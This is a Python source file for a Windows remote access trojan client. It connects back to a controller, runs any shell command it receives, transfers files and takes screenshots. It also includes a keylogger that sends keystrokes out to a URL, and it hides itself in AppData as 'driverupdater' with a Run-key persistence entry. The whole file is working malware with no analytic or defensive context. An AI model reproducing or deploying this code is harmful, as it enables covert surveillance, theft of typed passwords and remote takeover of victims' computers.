import socket
import json
import requests
import subprocess
import os
from PIL import Image
import io
import pyautogui
import base64
from pynput import keyboard
import time
import threading
import ctypes
import shutil
import sys

# User Variables
ip='localhost'
port=4444
auto_persistence=False

# Program's Variables
log=""
stop_flag=False

# Function to make persistence
def persistence():
    destination_folder = os.environ["AppData"]
    new_filename = "driverupdater" + os.path.splitext(sys.argv[0])[1]
    current_file = sys.argv[0]
    destination_path = os.path.join(destination_folder, new_filename)
    if not os.path.exists(destination_path):
        shutil.copy2(current_file, destination_path)
        subprocess.Popen('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v system /t REG_SZ /d "'+destination_path+'" /f',shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL)

# Function to remove persistence
def remove_persistence():
    destination_folder = os.environ["AppData"]
    new_filename = "driverupdater" + os.path.splitext(sys.argv[0])[1]
    current_file = sys.argv[0]
    destination_path = os.path.join(destination_folder, new_filename)
    if os.path.exists(destination_path):
        subprocess.Popen("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v system /f",shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL)
        subprocess.Popen(f"del /F {destination_path}",shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL)

# Function to send data in json serialized form
def send(client_socket,data):
    data=json.dumps(data)
    client_socket.sendall(data.encode())

# Function to recieve data in json form and deserialize it
def recv(client_socket):
    data=''
    while True:
        data+=(client_socket.recv(1024)).decode()
        try:
            data=json.loads(data)
            break
        except:
            continue
    return data

# Function to send keylogs
def sendlog(url,sec):
    global log,stop_flag
    while True:
        if not stop_flag:
            time.sleep(int(sec))
            temp=log
            log=""
            requests.get(url+temp)
        else:
            stop_flag=False
            break

# Function to record keystrokes
def keylogger(key):
    global log
    try:
        log+=f'{key.char}'
    except AttributeError:
        if f'{key}'=="Key.space":
            log+=" "
        else:
            log+=f'[{key}]'

# Function to display alert to victim
def display_alert(alert):
    ctypes.windll.user32.MessageBoxW(0, alert, "Alert", 1)

# Function to download a file
def download(client_socket,filename):
    data=recv(client_socket)
    data=data.encode()
    with open(filename,"wb") as file:
        file.write(base64.b64decode(data))
    send(client_socket,"Sent")

# Function to upload a file
def upload(client_socket,filename):
    filename=filename.strip()
    with open(filename,"rb") as file:
        data=base64.b64encode(file.read())
    send(client_socket,data.decode())
    recv(client_socket)

# Main Code
if auto_persistence:
    persistence()

while True:
    try:
        # Connecting back to server
        client_socket = socket.socket()
        client_socket.connect((ip, port))
        # Recieve and execute commands
        while True:
            cmd = recv(client_socket)
            if cmd=="Alive?":
                send(client_socket,"Yes")
            elif cmd=="exit":
                os._exit(0)
            elif cmd[:2]=="cd":
                os.chdir(cmd[3:])
                send(client_socket,"==>Directory Changed!")
            elif cmd[:8]=="download":
                upload(client_socket,cmd[9:])
            elif cmd[:6]=="upload":
                download(client_socket,cmd[7:])
            elif cmd[:15]=="keylogger start":
                cmd=cmd.split(",")
                listener=keyboard.Listener(on_press=keylogger)
                listener.start()
                sending_log=threading.Thread(target=sendlog,args=(cmd[1],cmd[2]))
                sending_log.start()
                send(client_socket,"==>Keylogger Started")
            elif cmd[:14]=="keylogger stop":
                listener.stop()
                stop_flag=True
                send(client_socket,"==>Keylogger Stopped")
            elif cmd[:5]=="alert":
                alert_thread = threading.Thread(target=display_alert,args=(cmd[6:],))
                alert_thread.start()
                send(client_socket,"==>Alert Sent!")
            elif cmd[:17]=="make persistence":
                persistence()
                send(client_socket,"==>Persistence Made!")
            elif cmd[:19]=="remove persistence":
                remove_persistence()
                send(client_socket,"==>Persistence Removed!")
            elif cmd=="screenshot":
                screenshot = pyautogui.screenshot()
                screenshot_bytes = io.BytesIO()
                screenshot.save(screenshot_bytes, format='PNG')
                screenshot_bytes = screenshot_bytes.getvalue()
                screenshot_bytes=base64.b64encode(screenshot_bytes)
                send(client_socket,screenshot_bytes.decode())
            else:
                try:
                    output=subprocess.check_output(cmd,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
                    send(client_socket,output.decode())
                except Exception as e:
                    print(e)
                    send(client_socket,"==>Invalid System Command")
    except:
        continue
